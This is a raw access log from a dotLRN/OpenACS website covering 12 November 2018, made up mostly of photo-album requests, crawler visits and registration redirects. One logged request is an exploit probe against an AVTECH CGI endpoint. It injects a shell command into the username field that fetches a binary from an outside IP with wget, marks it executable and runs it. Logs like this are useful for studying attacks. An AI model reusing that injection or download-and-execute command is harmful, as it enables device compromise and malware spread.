127.0.0.1 -conn:litli:17:10359- - [12/Nov/2018:00:31:42 -0500] "GET /dotlrn/clubs/calteknet/photo-album/images/32879 HTTP/1.0" 200 31177 "https://litli.net/" "Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0" "1542000702.000702 0.006664 0.000960 0.081531 0.049156"
127.0.0.1 -conn:litli:18:10360- - [12/Nov/2018:00:31:42 -0500] "GET /dotlrn/clubs/calteknet/photo-album/images/32855 HTTP/1.0" 200 32462 "https://litli.net/" "Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0" "1542000702.000702 0.010315 0.145717 0.050511 0.056340"
127.0.0.1 -conn:litli:17:10361- - [12/Nov/2018:00:31:42 -0500] "GET /dotlrn/clubs/calteknet/photo-album/images/32867 HTTP/1.0" 200 30133 "https://litli.net/" "Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0" "1542000702.000702 0.010315 0.147307 0.049465 0.057554"
127.0.0.1 -conn:litli:18:10362- - [12/Nov/2018:00:31:42 -0500] "GET /dotlrn/clubs/calteknet/photo-album/images/32903 HTTP/1.0" 200 30375 "https://litli.net/" "Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0" "1542000702.013367 0.019329 0.247178 0.084917 0.055647"
127.0.0.1 -conn:litli:17:10363- - [12/Nov/2018:00:31:42 -0500] "GET /dotlrn/clubs/calteknet/photo-album/images/32915 HTTP/1.0" 200 32342 "https://litli.net/" "Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0" "1542000702.360064 0.008603 0.000612 0.062872 0.049647"
127.0.0.1 -conn:litli:18:10364- - [12/Nov/2018:00:31:42 -0500] "GET /dotlrn/clubs/calteknet/photo-album/images/32927 HTTP/1.0" 200 28152 "https://litli.net/" "Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0" "1542000702.426412 0.003731 0.000788 0.066026 0.054319"
127.0.0.1 -conn:litli:17:10365- - [12/Nov/2018:00:31:42 -0500] "GET /dotlrn/clubs/calteknet/photo-album/images/32935 HTTP/1.0" 200 31377 "https://litli.net/" "Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0" "1542000702.475457 0.015737 0.012052 0.053996 0.046957"
127.0.0.1 -conn:litli:18:10366- - [12/Nov/2018:00:31:42 -0500] "GET /dotlrn/clubs/calteknet/photo-album/images/32951 HTTP/1.0" 200 32431 "https://litli.net/" "Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0" "1542000702.486562 0.008552 0.068628 0.071139 0.050830"
127.0.0.1 -conn:litli:17:10367- - [12/Nov/2018:00:31:42 -0500] "GET /dotlrn/clubs/calteknet/photo-album/images/32959 HTTP/1.0" 200 32359 "https://litli.net/" "Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0" "1542000702.628985 0.043812 0.006755 0.042725 0.082130"
127.0.0.1 -conn:litli:18:10368- - [12/Nov/2018:00:31:42 -0500] "GET /dotlrn/clubs/calteknet/photo-album/images/32975 HTTP/1.0" 200 31830 "https://litli.net/" "Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0" "1542000702.641021 0.017416 0.043744 0.090174 0.059205"
127.0.0.1 -conn:litli:17:10369- - [12/Nov/2018:00:31:42 -0500] "GET /dotlrn/clubs/calteknet/photo-album/images/32987 HTTP/1.0" 200 31571 "https://litli.net/" "Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0" "1542000702.765759 0.035859 0.006975 0.093722 0.044045"
127.0.0.1 -conn:litli:17:10370- - [12/Nov/2018:00:31:43 -0500] "GET /favicon.ico HTTP/1.0" 404 429 "" "Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0" "1542000703.031605 0.003223 0.002674 0.102555 0.027312"
127.0.0.1 -conn:litli:17:10371- - [12/Nov/2018:00:31:47 -0500] "GET /dotlrn/clubs/calteknet/photo-album/album?album_id=32702&page=3 HTTP/1.0" 200 3809 "https://litli.net/" "Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0" "1542000706.382222 0.015946 0.001869 0.071994 0.632175"
127.0.0.1 -conn:litli:17:10372- - [12/Nov/2018:00:31:47 -0500] "GET /dotlrn/clubs/calteknet/photo-album/images/33012 HTTP/1.0" 200 33529 "https://litli.net/" "Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0" "1542000707.273224 0.010028 0.003050 0.045626 0.038610"
127.0.0.1 -conn:litli:18:10373- - [12/Nov/2018:00:31:47 -0500] "GET /dotlrn/clubs/calteknet/photo-album/images/32999 HTTP/1.0" 200 31238 "https://litli.net/" "Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0" "1542000707.283338 0.020142 0.001208 0.038673 0.043318"
127.0.0.1 -conn:litli:18:10375- - [12/Nov/2018:00:31:47 -0500] "GET /dotlrn/clubs/calteknet/photo-album/images/33036 HTTP/1.0" 200 31116 "https://litli.net/" "Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0" "1542000707.288441 0.017719 0.092662 0.055322 0.031134"
127.0.0.1 -conn:litli:17:10374- - [12/Nov/2018:00:31:47 -0500] "GET /dotlrn/clubs/calteknet/photo-album/images/33024 HTTP/1.0" 200 31776 "https://litli.net/" "Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0" "1542000707.288441 0.017719 0.082324 0.065177 0.035374"
127.0.0.1 -conn:litli:18:10376- - [12/Nov/2018:00:31:47 -0500] "GET /favicon.ico HTTP/1.0" 404 429 "" "Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0" "1542000707.706158 0.006071 0.001331 0.036356 0.012972"
127.0.0.1 -conn:litli:18:10377- - [12/Nov/2018:00:35:07 -0500] "POST /dotlrn/clubs/calteknet/photo-album/photos-add-2 HTTP/1.0" 200 2213 "https://litli.net/" "Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0" "1542000709.764193 1.264980 0.002251 0.042232 197.338157"
127.0.0.1 -conn:litli:18:10378- - [12/Nov/2018:00:35:07 -0500] "GET /favicon.ico HTTP/1.0" 404 429 "" "Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0" "1542000907.565946 0.005324 0.001824 0.052650 0.079402"
127.0.0.1 -conn:litli:18:10379- - [12/Nov/2018:00:53:35 -0500] "GET /shared/parameters?package_key=xowiki&scope=global&return_url=/acs-admin/ HTTP/1.0" 302 1094 "" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "1542002015.284403 0.027822 0.001303 0.054479 0.068446"
127.0.0.1 -conn:litli:18:10380- - [12/Nov/2018:01:05:54 -0500] "GET /favicon.ico HTTP/1.0" 404 617 "" "Googlebot-Image/1.0" "1542002753.903123 0.038292 0.002632 0.120217 0.030507"
127.0.0.1 -conn:litli:18:10381- - [12/Nov/2018:01:38:51 -0500] "GET / HTTP/1.0" 302 842 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542004731.652382 0.000827 0.001488 0.054236 0.013884"
35.231.117.24 -conn:litli:18:10382- - [12/Nov/2018:01:38:51 -0500] "GET /dotlrn/index HTTP/1.1" 302 741 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542004731.810995 0.000888 0.001598 0.043450 0.068162"
35.231.117.24 -conn:litli:18:10383- - [12/Nov/2018:01:38:52 -0500] "GET /register/?return_url=http://litli.net:8000/dotlrn/index HTTP/1.1" 302 776 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542004731.998986 0.000798 0.001707 0.037981 0.054831"
127.0.0.1 -conn:litli:18:10384- - [12/Nov/2018:01:38:52 -0500] "GET / HTTP/1.0" 302 722 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542004732.393440 0.022158 0.001119 0.040597 0.124197"
35.231.117.24 -conn:litli:18:10385- - [12/Nov/2018:01:38:52 -0500] "GET /dotlrn/index HTTP/1.1" 302 766 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542004732.739706 0.088803 0.004927 0.042984 0.057860"
35.231.117.24 -conn:litli:18:10386- - [12/Nov/2018:01:38:53 -0500] "GET /register/?return_url=/dotlrn/index HTTP/1.1" 200 2910 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542004732.959731 0.039093 0.003210 0.036426 0.274012"
127.0.0.1 -conn:litli:18:10387- - [12/Nov/2018:01:38:53 -0500] "GET / HTTP/1.0" 302 722 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542004733.405370 0.004359 0.001634 0.037634 0.034491"
35.231.117.24 -conn:litli:18:10388- - [12/Nov/2018:01:38:53 -0500] "GET /dotlrn/index HTTP/1.1" 302 766 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542004733.598467 0.043123 0.004270 0.043840 0.057016"
35.231.117.24 -conn:litli:18:10389- - [12/Nov/2018:01:38:54 -0500] "GET /register/?return_url=/dotlrn/index HTTP/1.1" 200 2910 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542004733.831588 0.042662 0.003444 0.048118 0.218946"
127.0.0.1 -conn:litli:18:10390- - [12/Nov/2018:01:44:17 -0500] "GET / HTTP/1.0" 302 843 "" "" "1542005057.752443 0.000587 0.001636 0.056897 0.014118"
127.0.0.1 -conn:litli:18:10391- - [12/Nov/2018:02:21:47 -0500] "GET / HTTP/1.0" 302 843 "" "" "1542007307.938828 0.000443 0.000663 0.017825 0.005470"
127.0.0.1 -conn:litli:18:10392- - [12/Nov/2018:02:29:49 -0500] "GET / HTTP/1.0" 302 851 "" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7" "1542007789.635453 0.000300 0.000414 0.011497 0.006606"
127.0.0.1 -conn:litli:18:10393- - [12/Nov/2018:02:30:10 -0500] "GET / HTTP/1.0" 302 851 "" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "1542007810.426252 0.000409 0.000676 0.021790 0.016595"
127.0.0.1 -conn:litli:18:10394- - [12/Nov/2018:02:32:55 -0500] "GET / HTTP/1.0" 302 842 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542007975.048028 0.000422 0.000932 0.034577 0.011792"
35.185.61.170 -conn:litli:18:10395- - [12/Nov/2018:02:32:55 -0500] "GET /dotlrn/index HTTP/1.1" 302 741 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542007975.173367 0.000553 0.001650 0.034727 0.038302"
35.185.61.170 -conn:litli:18:10396- - [12/Nov/2018:02:32:55 -0500] "GET /register/?return_url=http://litli.net:8000/dotlrn/index HTTP/1.1" 302 776 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542007975.322469 0.000492 0.001281 0.034778 0.033422"
127.0.0.1 -conn:litli:18:10397- - [12/Nov/2018:02:32:55 -0500] "GET / HTTP/1.0" 302 722 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542007975.686275 0.016916 0.001311 0.035354 0.020298"
35.185.61.170 -conn:litli:18:10398- - [12/Nov/2018:02:32:56 -0500] "GET /dotlrn/index HTTP/1.1" 302 766 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542007975.913184 0.085148 0.001371 0.033394 0.056502"
35.185.61.170 -conn:litli:18:10399- - [12/Nov/2018:02:32:56 -0500] "GET /register/?return_url=/dotlrn/index HTTP/1.1" 200 2908 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542007976.223068 0.114106 0.001266 0.027600 0.202198"
127.0.0.1 -conn:litli:18:10400- - [12/Nov/2018:02:32:56 -0500] "GET / HTTP/1.0" 302 722 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542007976.587562 0.005036 0.001120 0.042095 0.019170"
35.185.61.170 -conn:litli:18:10401- - [12/Nov/2018:02:32:56 -0500] "GET /dotlrn/index HTTP/1.1" 302 766 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542007976.767942 0.040170 0.003003 0.038375 0.049403"
35.185.61.170 -conn:litli:18:10402- - [12/Nov/2018:02:32:57 -0500] "GET /register/?return_url=/dotlrn/index HTTP/1.1" 200 2910 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542007976.971090 0.040187 0.003216 0.037884 0.180944"
127.0.0.1 -conn:litli:18:10403- - [12/Nov/2018:02:53:55 -0500] "GET / HTTP/1.0" 302 851 "" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" "1542009235.747932 0.001273 0.001140 0.114563 0.022837"
127.0.0.1 -conn:litli:18:10404- - [12/Nov/2018:03:01:26 -0500] "GET / HTTP/1.0" 302 910 "" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0" "1542009685.804344 0.017066 0.000610 0.053662 0.157623"
60.191.38.77 -conn:litli:18:10405- - [12/Nov/2018:03:01:31 -0500] "GET /dotlrn/index HTTP/1.1" 302 959 "" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0" "1542009691.641829 3.756638 0.001459 0.079251 0.088512"
127.0.0.1 -conn:litli:18:10406- - [12/Nov/2018:03:04:49 -0500] "GET / HTTP/1.0" 302 910 "" "Mozilla/5.0 zgrab/0.x (compatible; Researchscan/t12sns; +http://researchscan.comsys.rwth-aachen.de)" "1542009889.592992 0.005493 0.005055 0.111709 0.042957"
137.226.113.28 -conn:litli:18:10407- - [12/Nov/2018:03:04:50 -0500] "GET /dotlrn/index HTTP/1.1" 302 958 "https://64.137.236.32:443/" "Mozilla/5.0 zgrab/0.x (compatible; Researchscan/t12sns; +http://researchscan.comsys.rwth-aachen.de)" "1542009890.466392 0.381134 0.002123 0.070211 0.089519"
137.226.113.28 -conn:litli:18:10408- - [12/Nov/2018:03:04:51 -0500] "GET /register/?return_url=/dotlrn/index HTTP/1.1" 200 3100 "https://litli.net:8443/dotlrn/index" "Mozilla/5.0 zgrab/0.x (compatible; Researchscan/t12sns; +http://researchscan.comsys.rwth-aachen.de)" "1542009890.750402 0.000000 0.001613 0.040673 0.308960"
85.117.98.233 -conn:litli:18:10409- - [12/Nov/2018:03:09:59 -0500] "GET / HTTP/1.1" 302 923 "" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1" "1542010199.698701 0.515190 0.001680 0.033942 0.012958"
85.117.98.233 -conn:litli:18:10410- - [12/Nov/2018:03:10:00 -0500] "GET /dotlrn/index HTTP/1.1" 302 779 "" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1" "1542010200.687278 0.476740 0.001102 0.042651 0.053679"
85.117.98.233 -conn:litli:18:10411- - [12/Nov/2018:03:10:02 -0500] "GET /register/?return_url=/dotlrn/index HTTP/1.1" 200 2914 "" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1" "1542010201.815915 0.520107 0.010281 0.047916 0.269311"
127.0.0.1 -conn:litli:18:10412- - [12/Nov/2018:03:10:24 -0500] "GET / HTTP/1.0" 302 843 "" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "1542010224.053872 0.001234 0.001583 0.086885 0.032026"
180.76.15.13 -conn:litli:18:10413- - [12/Nov/2018:03:10:24 -0500] "GET /dotlrn/index HTTP/1.1" 302 741 "" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "1542010224.667728 0.001383 0.001496 0.098950 0.127518"
180.76.15.149 -conn:litli:18:10414- - [12/Nov/2018:03:10:25 -0500] "GET /register/?return_url=http://litli.net:8000/dotlrn/index HTTP/1.1" 302 776 "" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "1542010225.445402 0.000790 0.001877 0.051212 0.094782"
180.76.15.12 -conn:litli:18:10415- - [12/Nov/2018:03:10:27 -0500] "GET /register/?return_url=http://litli.net:8000/dotlrn/index HTTP/1.1" 200 8948 "" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "1542010226.600166 0.493310 0.003535 0.070504 0.435341"
127.0.0.1 -conn:litli:18:10416- - [12/Nov/2018:03:19:10 -0500] "GET / HTTP/1.0" 302 850 "" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "1542010750.666313 0.000416 0.001520 0.018240 0.005740"
127.0.0.1 -conn:litli:18:10417- - [12/Nov/2018:03:21:42 -0500] "GET / HTTP/1.0" 302 850 "" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" "1542010902.441235 0.000307 0.000795 0.023493 0.006275"
127.0.0.1 -conn:litli:18:10418- - [12/Nov/2018:03:22:04 -0500] "GET / HTTP/1.0" 302 851 "" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "1542010924.222823 0.000165 0.000439 0.009090 0.005167"
127.0.0.1 -conn:litli:18:10419- - [12/Nov/2018:03:22:30 -0500] "GET /robots.txt HTTP/1.0" 200 1176 "" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" "1542010950.393486 0.000119 0.000380 0.016652 0.000803"
127.0.0.1 -conn:litli:18:10420- - [12/Nov/2018:03:22:31 -0500] "GET / HTTP/1.0" 302 843 "" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" "1542010950.998421 0.000216 0.000244 0.006648 0.002856"
127.0.0.1 -conn:litli:18:10421- - [12/Nov/2018:03:26:04 -0500] "GET / HTTP/1.0" 302 842 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542011164.136208 0.000098 0.000170 0.006534 0.003203"
35.237.206.203 -conn:litli:17:10422- - [12/Nov/2018:03:26:04 -0500] "GET /dotlrn/index HTTP/1.1" 302 741 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542011164.222840 0.000496 0.000780 0.028552 0.038800"
35.237.206.203 -conn:litli:17:10423- - [12/Nov/2018:03:26:04 -0500] "GET /register/?return_url=http://litli.net:8000/dotlrn/index HTTP/1.1" 302 776 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542011164.370889 0.006931 0.000778 0.016532 0.012312"
127.0.0.1 -conn:litli:17:10424- - [12/Nov/2018:03:26:04 -0500] "GET / HTTP/1.0" 302 722 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542011164.673112 0.007360 0.000647 0.014467 0.034027"
35.237.206.203 -conn:litli:17:10425- - [12/Nov/2018:03:26:05 -0500] "GET /dotlrn/index HTTP/1.1" 302 766 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542011164.931096 0.122756 0.001021 0.026839 0.046687"
35.237.206.203 -conn:litli:17:10426- - [12/Nov/2018:03:26:05 -0500] "GET /register/?return_url=/dotlrn/index HTTP/1.1" 200 2907 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542011165.197680 0.049034 0.000371 0.012705 0.060160"
127.0.0.1 -conn:litli:17:10427- - [12/Nov/2018:03:26:05 -0500] "GET / HTTP/1.0" 302 722 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542011165.391735 0.001485 0.000481 0.008747 0.013393"
35.237.206.203 -conn:litli:17:10428- - [12/Nov/2018:03:26:05 -0500] "GET /dotlrn/index HTTP/1.1" 302 766 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542011165.555553 0.046240 0.000862 0.017484 0.027174"
35.237.206.203 -conn:litli:17:10429- - [12/Nov/2018:03:26:05 -0500] "GET /register/?return_url=/dotlrn/index HTTP/1.1" 200 2909 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542011165.711123 0.037915 0.001121 0.014906 0.097353"
127.0.0.1 -conn:litli:17:10430- - [12/Nov/2018:03:26:10 -0500] "GET / HTTP/1.0" 302 842 "" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "1542011170.744852 0.000430 0.000882 0.027279 0.006630"
66.249.69.114 -conn:litli:17:10431- - [12/Nov/2018:03:26:11 -0500] "GET /dotlrn/index HTTP/1.1" 302 746 "" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "1542011171.743974 0.000433 0.001038 0.012086 0.039821"
127.0.0.1 -conn:litli:17:10432- - [12/Nov/2018:03:38:05 -0500] "GET /robots.txt HTTP/1.0" 200 1176 "" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" "1542011885.509263 0.000547 0.001127 0.041730 0.005627"
127.0.0.1 -conn:litli:17:10433- - [12/Nov/2018:03:43:23 -0500] "GET / HTTP/1.0" 302 850 "" "" "1542012203.317385 0.000404 0.000724 0.035069 0.013582"
46.148.26.2 -conn:litli:17:10434- - [12/Nov/2018:03:43:23 -0500] "GET /dotlrn/index HTTP/1.1" 302 944 "http://64.137.236.32/" "" "1542012203.615903 0.000437 0.000836 0.038613 0.057858"
46.148.26.2 -conn:litli:17:10435- - [12/Nov/2018:03:43:24 -0500] "GET /register/?return_url=http://64.137.236.32:8000/dotlrn/index HTTP/1.1" 302 980 "http://64.137.236.32:8000/dotlrn/index" "" "1542012203.962472 0.000967 0.001112 0.040861 0.039305"
127.0.0.1 -conn:litli:17:10436- - [12/Nov/2018:04:11:16 -0500] "GET /robots.txt HTTP/1.0" 200 1239 "" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" "1542013876.290177 0.030497 0.000711 0.092077 0.004873"
127.0.0.1 -conn:litli:17:10437- - [12/Nov/2018:04:11:17 -0500] "GET / HTTP/1.0" 302 909 "" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" "1542013876.943005 0.009006 0.002220 0.149830 0.133785"
127.0.0.1 -conn:litli:17:10438- - [12/Nov/2018:04:13:48 -0500] "GET / HTTP/1.0" 302 843 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542014028.597547 0.000322 0.001000 0.013415 0.003024"
35.237.9.77 -conn:litli:17:10439- - [12/Nov/2018:04:13:48 -0500] "GET /dotlrn/index HTTP/1.1" 302 741 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542014028.698808 0.000600 0.000866 0.021527 0.037858"
35.237.9.77 -conn:litli:17:10440- - [12/Nov/2018:04:13:48 -0500] "GET /register/?return_url=http://litli.net:8000/dotlrn/index HTTP/1.1" 302 776 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542014028.832298 0.000650 0.000772 0.029883 0.015754"
127.0.0.1 -conn:litli:17:10441- - [12/Nov/2018:04:13:49 -0500] "GET / HTTP/1.0" 302 722 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542014029.159115 0.005262 0.000844 0.026110 0.019033"
35.237.9.77 -conn:litli:17:10442- - [12/Nov/2018:04:13:49 -0500] "GET /dotlrn/index HTTP/1.1" 302 766 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542014029.449341 0.137696 0.000827 0.026683 0.047441"
35.237.9.77 -conn:litli:17:10443- - [12/Nov/2018:04:13:50 -0500] "GET /register/?return_url=/dotlrn/index HTTP/1.1" 200 2906 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542014030.190883 0.452084 0.001678 0.027173 0.090990"
127.0.0.1 -conn:litli:17:10444- - [12/Nov/2018:04:13:50 -0500] "GET / HTTP/1.0" 302 722 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542014030.696348 0.001732 0.000531 0.011918 0.005489"
35.237.9.77 -conn:litli:17:10445- - [12/Nov/2018:04:13:51 -0500] "GET /dotlrn/index HTTP/1.1" 302 766 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542014031.319169 0.293934 0.000366 0.007586 0.021802"
35.237.9.77 -conn:litli:17:10446- - [12/Nov/2018:04:13:51 -0500] "GET /register/?return_url=/dotlrn/index HTTP/1.1" 200 2910 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542014031.706503 0.170416 0.001561 0.028220 0.102424"
127.0.0.1 -conn:litli:17:10447- - [12/Nov/2018:04:14:04 -0500] "GET / HTTP/1.0" 302 843 "" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" "1542014044.696264 0.000536 0.000504 0.018640 0.006876"
209.52.149.41 -conn:litli:17:10448- - [12/Nov/2018:04:14:45 -0500] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 590 "" "Sefa" "1542014085.742721 0.001464 0.003902 0.000451 0.002885"
127.0.0.1 -conn:litli:17:10449- - [12/Nov/2018:04:45:10 -0500] "GET / HTTP/1.0" 302 842 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542015910.395110 0.000397 0.000630 0.030367 0.008365"
35.237.72.141 -conn:litli:17:10450- - [12/Nov/2018:04:45:12 -0500] "GET /dotlrn/index HTTP/1.1" 302 741 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542015912.599341 1.345327 0.001183 0.026566 0.027657"
35.237.72.141 -conn:litli:17:10451- - [12/Nov/2018:04:45:14 -0500] "GET /register/?return_url=http://litli.net:8000/dotlrn/index HTTP/1.1" 302 776 "" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624" "1542015914.504357 1.315563 0.002013 0.025594 0.019384"
